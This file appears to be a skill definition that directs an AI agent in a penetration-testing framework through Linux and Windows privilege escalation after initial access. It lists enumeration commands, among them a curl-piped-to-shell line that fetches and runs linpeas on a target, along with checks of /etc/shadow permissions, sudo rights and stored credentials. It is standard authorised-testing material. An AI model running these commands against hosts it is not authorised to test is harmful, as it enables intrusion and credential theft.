---
name: privilege-escalation
description: Privilege escalation techniques — SUID/SGID, kernel exploits, misconfigurations, credential reuse. Maps to Hunter NET09 and MITRE ATT&CK TA0004.
allowed-tools: Read, Grep, Glob, Bash
---

# Privilege Escalation Skill

## When to Use
- After gaining initial access to a host (low-privilege shell)
- When testing for local privilege escalation paths

## Tool Chain

### Linux Privilege Escalation
    # Automated enumeration
    # Upload and run linpeas:
    curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee $PROJECT_DIR/hunter/recon/linpeas-TARGET.txt

    # Manual checks:
    # SUID/SGID binaries
    find / -perm -4000 -type f 2>/dev/null
    find / -perm -2000 -type f 2>/dev/null

    # Writable /etc/passwd or /etc/shadow
    ls -la /etc/passwd /etc/shadow

    # Sudo permissions
    sudo -l

    # Cron jobs
    cat /etc/crontab; ls -la /etc/cron.*

    # Kernel version (check for exploits)
    uname -a; cat /etc/os-release
    searchsploit linux kernel MAJOR.MINOR

    # Capabilities
    getcap -r / 2>/dev/null

    # World-writable directories in PATH
    echo $PATH | tr ':' '\n' | xargs -I{} find {} -writable -type d 2>/dev/null

### Windows Privilege Escalation
    # Automated enumeration (winpeas)
    # Or manual:
    whoami /all
    systeminfo
    net user; net localgroup administrators
    netstat -ano

    # Unquoted service paths
    wmic service get name,displayname,pathname,startmode | findstr /v "C:\Windows"

    # Weak service permissions
    accesschk.exe -uwcqv "Authenticated Users" * /accepteula

    # AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

    # Stored credentials
    cmdkey /list

## GTFOBins / LOLBAS
- Linux SUID/sudo escalation: https://gtfobins.github.io/
- Windows LOLBins: https://lolbas-project.github.io/

## Key Findings
- **Critical**: Writable /etc/passwd, sudo NOPASSWD to shell, kernel exploit yielding root
- **High**: SUID on GTFOBins binary, AlwaysInstallElevated, unquoted service path with write access
- **Medium**: Credential reuse from DB to system account, weak file permissions on sensitive files

## Output
Document: escalation path, from-user, to-user, technique used, and evidence.

## Validate & Promote

Findings from this skill are born `theoretical` (see the validation layer in the repo-root `CLAUDE.md`). They do NOT enter a report or external submission until promoted to `confirmed` with `scripts/validate-finding.sh`, after the independent check below.

- **Independent check for this class:** Show the elevated context (id/whoami = root/SYSTEM) achieved via the vector, with the pre-escalation context as control.
- Only `confirmed` findings ship. `validated` = reproduced but not independently confirmed.

```bash
bash scripts/validate-finding.sh --project-dir "$PROJECT_DIR" --agent hunter \
  --id HUN-NNN --state confirmed --method manual-repro \
  --negative-control "<what you proved, and the control result>" --by hunter
```
